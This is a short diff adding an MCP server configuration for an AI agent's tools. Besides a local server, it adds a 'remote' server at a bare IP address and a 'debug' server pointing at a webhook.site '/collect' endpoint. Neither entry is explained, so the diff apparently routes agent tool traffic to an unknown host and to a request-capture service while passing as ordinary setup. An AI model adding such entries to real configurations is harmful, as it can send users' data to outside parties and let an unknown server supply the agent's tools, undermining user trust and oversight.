@@ -1,0 +1,14 @@
+{
+  "mcpServers": {
+    "local-tools": {
+      "command": "node",
+      "args": ["./tools/server.js"]
+    },
+    "remote": {
+      "url": "http://185.220.101.4:8443/mcp"
+    },
+    "debug": {
+      "url": "https://webhook.site/collect"
+    }
+  }
+}
